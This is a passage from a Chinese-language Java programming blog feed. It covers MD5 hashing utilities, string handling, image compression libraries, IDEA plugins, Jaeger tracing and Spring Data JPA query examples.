s)</td></tr><tr><td>int</td><td>Integer.parseInt(str)</td><td>String.valueOf([int] i)</td><td>Int.toString([int] i)</td></tr><tr><td>long</td><td>Long.parseLong(str)</td><td>String.valueOf([long] l)</td><td>Long.toString([long] l)</td></tr><tr><td>float</td><td>Float.parseFloat(str)</td><td>String.valueOf([float] f)</td><td>Float.toString([float] f)</td></tr><tr><td>double</td><td>Double.parseDouble(str)</td><td>String.valueOf([double] d)</td><td>Double.toString([double] b)</td></tr></tbody></table><h2 id="4-读取字符串获取hash值"><a href="#4-读取字符串获取hash值" class="headerlink" title="4. 读取字符串获取hash值"></a>4. 读取字符串获取hash值</h2> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(File path)</span> </span>&#123;</span><br><span class="line">    Preconditions.notNull(path, <span class="string">&quot;path:%s is null&quot;</span>.formatted(path));</span><br><span class="line">    String md5Text;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> MessageDigest md5 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(path)) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8192</span>];</span><br><span class="line">            <span class="keyword">int</span> length = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((length = fileInputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                md5.update(buffer, <span class="number">0</span>, length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] digest = md5.digest();</span><br><span class="line">        md5Text = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, digest).toString(<span class="number">16</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException | FileNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;file not found exception&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;read file exception&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// or guava way</span></span><br><span class="line">    <span class="comment">//  Files.asByteSource(path).hash(Hashing.md5()).toString();</span></span><br><span class="line">    <span class="keyword">return</span> md5Text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Preconditions.notBlank(text, <span class="string">&quot;text: %s is null&quot;</span>.formatted(text));</span><br><span class="line">    String md5Text;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] textBytes = text.getBytes();</span><br><span class="line">        <span class="keyword">final</span> MessageDigest messageDigest = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        messageDigest.update(textBytes);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] digest = messageDigest.digest();</span><br><span class="line">        md5Text = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, digest).toString(<span class="number">16</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;NoSuchAlgorithmException for %s&quot;</span>.formatted(text));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> md5Text;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-字符串分割操作"><a href="#5-字符串分割操作" class="headerlink" title="5. 字符串分割操作"></a>5. 字符串分割操作</h2><p> 如何进行字符串的分割操作？</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// StringJoiner</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// java8</span></span><br><span class="line"><span class="keyword">final</span> String commandStr = compileCommand.stream().map(String::toString)</span><br><span class="line">                    .collect(Collectors.joining(<span class="string">&quot; &quot;</span>));</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-StringBuffer-vs-StringBuilder&quot;&gt;&lt;a href=&quot;#1-StringBuffer-vs-StringBuilder&quot; class=&quot;headerlink&quot; title=&quot;1. StringBuffer vs StringBuild</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="java基础系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/java%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java基础" scheme="https://seniortesting.club/tags/java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="字符串" scheme="https://seniortesting.club/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>图片压缩技术选型</title>
    <link href="https://seniortesting.club/posts/02nOPVFCy6D/"/>
    <id>https://seniortesting.club/posts/02nOPVFCy6D/</id>
    <published>2021-04-16T12:37:44.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<p>收集可用的java的图片压缩技术</p><h2 id="图片格式演变过程"><a href="#图片格式演变过程" class="headerlink" title="图片格式演变过程"></a>图片格式演变过程</h2><p>1、1992年 JPEG标准发布<br>目前主流浏览器的原生支持<br>开源库：libjpeg、mozjpeg、miniJPEG<br>mozjpeg是Mozilla开发的编码库，能提升5%左右的压缩<br>minijpeg是以色列一家公司开发的JPEG转码，宣称能提高5%-50%的压缩</p><p>主要技术：8x8分块、8x8 浮点DCT变换、频带量化、Zig-Zag扫描、查表式熵编码</p><p>libjpeg：<br>主页：<a href="http://libjpeg.sourceforge.net/" target="_blank" rel="noopener">http://libjpeg.sourceforge.net/</a><br>Libjpeg is a widely used C library for reading and writing JPEG image files. It was developed by Tom Lane and the Independent JPEG Group (IJG) during the 1990’s and it is now maintained by several developers using various services identified in the SourceForge summary.<br>The latest release is version 6b of 27-Mar-1998. This is a stable and solid foundation for many application’s JPEG support.</p><p>2、2000年 JPEG2000发布</p><p>ISO/IEC 15444-1 、ITU-T T.800<br><a href="http://www.itu.int/itu-t/recommendations/rec.aspx?rec=12682" target="_blank" rel="noopener">http://www.itu.int/itu-t/recommendations/rec.aspx?rec=12682</a></p><p>卡卡杜公司的编码器：kdu_compress 目前的版本是7.8<br><a href="http://kakadusoftware.com/software/" target="_blank" rel="noopener">http://kakadusoftware.com/software/</a></p><p>主要技术：离散小波变换（9-7浮点、5-3整数）、支持有损和无损压缩、支持分辨率渐进式、支持码率渐进式<br>维基百科：<a href="https://en.wikipedia.org/wiki/JPEG_2000" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/JPEG_2000</a></p><p>openJPEG：开源的编解码实现，目前被作为官方的参考代码<br>主页：<a href="http://www.openjpeg.org/" target="_blank" rel="noopener">http://www.openjpeg.org/</a><br>代码：<a href="https://github.com/uclouvain/openjpeg" target="_blank" rel="noopener">https://github.com/uclouvain/openjpeg</a></p><p>3、2009年 JPEG XR<br>用于替换现有的JPEG2000，增加HDR支持</p><p>4、2014年 BPG （Better Portable Graphics）<br>基于HEVC 帧内编码的静态图像格式<br>由Fabrice Bellard开发，主流的浏览器不能原生支持，可以使用1个56KB的Javascript库来进行解码、显示。<br>专利：由于使用HEVC的技术，然后考虑到美国20年的专利有效期，2014+20=2034年时才能免费自由的使用</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>对于 JPEG 使用 libjpeg 压缩，JPEG 2000 使用 OpenJPEG，WebP 使用 libwebp。综合看来，WebP 略好于 JPEG 2000，两者都明显好于 JPEG。Jpeg XR 2007年推出，背后是微软PCT小组1999年开始的研究，Webp背后是谷歌在储存领域的雄心。</p><h2 id="Image-Compression-in-java"><a href="#Image-Compression-in-java" class="headerlink" title="Image Compression in java"></a>Image Compression in java</h2><p>search in google for a few hours to find a good solution to compress the image using in java. This is the best mentioned:</p><p><a href="https://stackoverflow.com/questions/24745147/java-resize-image-without-losing-quality" target="_blank" rel="noopener">https://stackoverflow.com/questions/24745147/java-resize-image-without-losing-quality</a></p><p>So here i compress two libraried I used in my project ,one is from <a href="https://github.com/looly/hutool/issues" target="_blank" rel="noopener">Hutool</a>‘s <code>ImgUtil.compress(testFile, outputFile, 0.5f);</code><br>static method ,one is from <a href="https://github.com/coobird/thumbnailator" target="_blank" rel="noopener">thumbnailator</a>, but you should know that this library had not maintenace for a long time.<br>The code i used for the performance testing here:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">String file=<span class="string">&quot;D:\\yEJnna3mCMK8.jpg&quot;</span>;</span><br><span class="line">File testFile = <span class="keyword">new</span> File(file);</span><br><span class="line">File outputFile=<span class="keyword">new</span> File(<span class="string">&quot;D:\\test1.jpg&quot;</span>);</span><br><span class="line">File outputFile2=<span class="keyword">new</span> File(<span class="string">&quot;D:\\test2.jpg&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">    ImgUtil.compress(testFile, outputFile, <span class="number">0.5f</span>);</span><br><span class="line">    <span class="keyword">long</span> lostTime1 = System.currentTimeMillis() - startTime;</span><br><span class="line">    System.out.println(<span class="string">&quot;take time1 from hutool =&quot;</span> + Long.toString(lostTime1));</span><br><span class="line">    <span class="keyword">long</span> startTime2 = System.currentTimeMillis();</span><br><span class="line">    ImageUtils.compressImage(testFile, outputFile2, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">long</span> lostTime2 = System.currentTimeMillis() - startTime2;</span><br><span class="line">    System.out.println(<span class="string">&quot;take time2 from thumbnail =&quot;</span> + Long.toString(lostTime2));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lostTime1&lt;lostTime2)&#123;</span><br><span class="line">        count=count+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;hutool better than thumnail count is: &quot;</span>+count);</span><br></pre></td></tr></table></figure><p>At last found hutool is faster than thumbnailator, so take to use it then. over…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;收集可用的java的图片压缩技术&lt;/p&gt;
&lt;h2 id=&quot;图片格式演变过程&quot;&gt;&lt;a href=&quot;#图片格式演变过程&quot; class=&quot;headerlink&quot; title=&quot;图片格式演变过程&quot;&gt;&lt;/a&gt;图片格式演变过程&lt;/h2&gt;&lt;p&gt;1、1992年 JPEG标准发布&lt;br&gt;目前</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="hutool" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/hutool/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="javascript" scheme="https://seniortesting.club/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Idea常用技巧和常用插件</title>
    <link href="https://seniortesting.club/posts/zr5nOPVFCy6D/"/>
    <id>https://seniortesting.club/posts/zr5nOPVFCy6D/</id>
    <published>2021-04-16T12:37:44.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Codota-人工智能代码提示"><a href="#1-Codota-人工智能代码提示" class="headerlink" title="1. Codota - 人工智能代码提示"></a>1. Codota - 人工智能代码提示</h2><h2 id="2-GitToolBox"><a href="#2-GitToolBox" class="headerlink" title="2. GitToolBox"></a>2. GitToolBox</h2><h2 id="3-Maven-Helper"><a href="#3-Maven-Helper" class="headerlink" title="3. Maven Helper"></a>3. Maven Helper</h2><h2 id="4-Alibaba-Java-Coding-Guidelines"><a href="#4-Alibaba-Java-Coding-Guidelines" class="headerlink" title="4. Alibaba Java Coding Guidelines"></a>4. Alibaba Java Coding Guidelines</h2><h2 id="5-Pojo-Generator"><a href="#5-Pojo-Generator" class="headerlink" title="5. Pojo Generator"></a>5. Pojo Generator</h2><h2 id="leetcode-Editor"><a href="#leetcode-Editor" class="headerlink" title="leetcode Editor"></a>leetcode Editor</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-Codota-人工智能代码提示&quot;&gt;&lt;a href=&quot;#1-Codota-人工智能代码提示&quot; class=&quot;headerlink&quot; title=&quot;1. Codota - 人工智能代码提示&quot;&gt;&lt;/a&gt;1. Codota - 人工智能代码提示&lt;/h2&gt;&lt;h2 id=</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="idea" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/idea/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>jaeger分布式追踪系统介绍</title>
    <link href="https://seniortesting.club/posts/9535nOPVFCy6D/"/>
    <id>https://seniortesting.club/posts/9535nOPVFCy6D/</id>
    <published>2021-04-16T12:37:44.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="jager和opentracing"><a href="#jager和opentracing" class="headerlink" title="jager和opentracing"></a>jager和opentracing</h2><p>Jaeger\ˈyā-gər\ 是Uber开源的分布式追踪系统，是遵循Opentracing的系统之一，也是CNCF项目。本篇将使用Jaeger来演示如何在系统中引入分布式追踪。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;jager和opentracing&quot;&gt;&lt;a href=&quot;#jager和opentracing&quot; class=&quot;headerlink&quot; title=&quot;jager和opentracing&quot;&gt;&lt;/a&gt;jager和opentracing&lt;/h2&gt;&lt;p&gt;Jaeger\ˈyā</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="jaeger" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/jaeger/"/>
    
    
  </entry>
  
  <entry>
    <title>spring JPA使用技巧问题整理</title>
    <link href="https://seniortesting.club/posts/94t235nOPVFCy6D/"/>
    <id>https://seniortesting.club/posts/94t235nOPVFCy6D/</id>
    <published>2021-04-16T12:37:44.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="如何自动生成一个spring-jpa-entity？"><a href="#如何自动生成一个spring-jpa-entity？" class="headerlink" title="如何自动生成一个spring jpa entity？"></a>如何自动生成一个spring jpa entity？</h2><p>参考： <a href="https://blog.csdn.net/linmengmeng_1314/article/details/101599559" target="_blank" rel="noopener">https://blog.csdn.net/linmengmeng_1314/article/details/101599559</a></p><ol><li>新建一个数据源连接</li><li>修改对应的groovy脚本，配置生成的脚本</li><li>选择对应的表，然后生成对应的entity文件</li></ol><p>以上的操作不再使用，可以采用idea的POJO generator插件</p><h2 id="Entity中常量如何转为枚举类型？"><a href="#Entity中常量如何转为枚举类型？" class="headerlink" title="Entity中常量如何转为枚举类型？"></a>Entity中常量如何转为枚举类型？</h2><p>对于数据库中某些字段是一些常量值，此时可以考虑转为枚举类型，操作如下：</p><p>1.创建枚举文件夹<code>constant.enums</code> ，常量文件夹<code>constant.consist</code>;</p><p>通过code转枚举对象方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static ListingType toEnum(String value) &#123;</span><br><span class="line">    return Stream.of(ListingType.values()).filter(item -&gt; item.getDbMappingKey().equals(value))</span><br><span class="line">            .findFirst().orElse(null);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CrudRepository-和-JpaRepository-区别"><a href="#CrudRepository-和-JpaRepository-区别" class="headerlink" title="CrudRepository 和 JpaRepository 区别"></a>CrudRepository 和 JpaRepository 区别</h2><p>使用Spring Data JPA CrudRepository 和JpaRepository 的好处：</p><p>继承这些接口，可以使Spring找到自定义的数据库操作接口，并生成代理类，后续可以注入到Spring容器中；<br>可以不写相关的sql操作，由代理类生成<br>他们存在继承关系：</p><p>PagingAndSortingRepository 继承 CrudRepository<br>JpaRepository 继承 PagingAndSortingRepository</p><p>也就是说， CrudRepository 提供基本的增删改查；<br>PagingAndSortingRepository 提供分页和排序方法；<br>JpaRepository 提供JPA需要的方法。</p><h2 id="常用JpaRepository方法代码"><a href="#常用JpaRepository方法代码" class="headerlink" title="常用JpaRepository方法代码"></a>常用<code>JpaRepository</code>方法代码</h2><h3 id="1-方法的参数如何在sql中表示？"><a href="#1-方法的参数如何在sql中表示？" class="headerlink" title="1. 方法的参数如何在sql中表示？"></a>1. 方法的参数如何在sql中表示？</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果参数不加上@param，则可以用索引1，2，3，4代表对应的参数，采用?</span></span><br><span class="line"><span class="meta">@Query(value = &quot;select ACCOUNT_ID, sum(AMOUNT) &quot; +</span></span><br><span class="line"><span class="meta">            &quot;from TRANSACTION t &quot; +</span></span><br><span class="line"><span class="meta">            &quot;where t.TXN_STATUS=?1 &quot; +</span></span><br><span class="line"><span class="meta">            &quot;and t.TXN_TYPE=?2 &quot; +</span></span><br><span class="line"><span class="meta">            &quot;and t.TIME_CREATED&gt;=?3 &quot; +</span></span><br><span class="line"><span class="meta">            &quot;and t.TIME_CREATED&lt;=?4 &quot; +</span></span><br><span class="line"><span class="meta">            &quot;group by t.ACCOUNT_ID &quot;</span></span><br><span class="line"><span class="meta">            , nativeQuery = true)</span></span><br><span class="line">    List&lt;Object[]&gt; queryAccountAndAmount(String txnStatus, String txnType, Long startTime, Long endTime);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果加上@Param参数可以直接采用关键字进行参数赋值，采用：</span></span><br><span class="line"><span class="comment">// 另外如果查询的结果是一个表，可以直接返回List&lt;entity&gt;，否则返回的是List&lt;Object[]&gt; 类型</span></span><br><span class="line"><span class="meta">@Query(value = &quot;SELECT t FROM PERSON t &quot; +</span></span><br><span class="line"><span class="meta">            &quot;WHERE t.custName=:custName &quot; +</span></span><br><span class="line"><span class="meta">            &quot;AND t.certNoHash=:certNoHash &quot; +</span></span><br><span class="line"><span class="meta">            &quot;AND t.listType=:type &quot; +</span></span><br><span class="line"><span class="meta">            &quot;AND t.certType=:certType &quot; +</span></span><br><span class="line"><span class="meta">            &quot;AND t.isEnabled=true AND (t.expireDate is null OR t.expireDate&gt;=:expireDate)&quot;)</span></span><br><span class="line">    <span class="function">List&lt;Person&gt; <span class="title">findAxxx</span><span class="params">(<span class="meta">@Param(&quot;custName&quot;)</span> String custName,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="meta">@Param(&quot;certNoHash&quot;)</span> String certNoHash,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="meta">@Param(&quot;certType&quot;)</span> DocumentTypeEnum certType,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="meta">@Param(&quot;type&quot;)</span> ListType type,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="meta">@Param(&quot;expireDate&quot;)</span> Date date)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="2-查询条件的参数如果是对象，对应的sql怎么书写？"><a href="#2-查询条件的参数如果是对象，对应的sql怎么书写？" class="headerlink" title="2. 查询条件的参数如果是对象，对应的sql怎么书写？"></a>2. 查询条件的参数如果是对象，对应的sql怎么书写？</h3><p>传入的参数是个对象,采用#</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Query(&quot;select t &quot;</span></span><br><span class="line"><span class="meta">            + &quot; from Threshold t &quot;</span></span><br><span class="line"><span class="meta">            + &quot; where t.stat=:#&#123;#param.comRuleStat&#125;&quot;</span></span><br><span class="line"><span class="meta">            + &quot; and t.type=:#&#123;#param.thresholdType&#125;  &quot;</span></span><br><span class="line"><span class="meta">            + &quot; and t.isRealNameCertify=:#&#123;#param.isRealNameCertify&#125; &quot;</span></span><br><span class="line"><span class="meta">            + &quot; and t.custType=:#&#123;#param.custType&#125; &quot;</span></span><br><span class="line"><span class="meta">            + &quot; and t.payChannel=:#&#123;#param.payChannel&#125; &quot;</span></span><br><span class="line"><span class="meta">            + &quot; and t.TxnCd=:#&#123;#param.intTxnCd&#125; &quot;, nativeQuery = true</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="function">List&lt;Threshold&gt; <span class="title">queryThreshold</span><span class="params">(<span class="meta">@Param(&quot;param&quot;)</span> ThresholdQuery thresholdQuery)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="3-如何查询一个数组或者list的数据？"><a href="#3-如何查询一个数组或者list的数据？" class="headerlink" title="3. 如何查询一个数组或者list的数据？"></a>3. 如何查询一个数组或者list的数据？</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ClientRepository</span> <span class="keyword">extends</span> <span class="title">CrudRepository</span>&lt;<span class="title">Client</span>, <span class="title">Long</span>&gt;, <span class="title">JpaSpecificationExecutor</span>&lt;<span class="title">Client</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(value = &quot;SELECT * FROM Client t WHERE t.id IN (:ids) &quot; , nativeQuery = true)</span></span><br><span class="line">    <span class="function">List&lt;Client&gt; <span class="title">findByIds</span><span class="params">(<span class="meta">@Param(&quot;ids&quot;)</span> List&lt;String&gt; ids)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jpa 语句IsIn</span></span><br><span class="line"><span class="function">Integer <span class="title">countByTimeCreatedGreaterThanEqualAndTimeCreatedLessThanAndBankIdIsInAndTxnStatusIsIn</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        Long startTime, Long endTime,</span></span></span><br><span class="line"><span class="function"><span class="params">        List&lt;Long&gt; bankId,</span></span></span><br><span class="line"><span class="function"><span class="params">        List&lt;TxnStatus&gt; status)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="4-查询条件动态sql构建，条件不固定怎么操作？"><a href="#4-查询条件动态sql构建，条件不固定怎么操作？" class="headerlink" title="4. 查询条件动态sql构建，条件不固定怎么操作？"></a>4. 查询条件动态sql构建，条件不固定怎么操作？</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Query(value = &quot;select * from LOGIN_LOGS where 1=1 and if(?1 !=&#x27;&#x27;,ip=?1,1=1) and if(?2 !=&#x27;&#x27;,custId&lt;&gt;?2,1=1)&quot;,</span></span><br><span class="line"><span class="meta">            nativeQuery = true)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-如何执行一个自定义的更新和删除的Sql？"><a 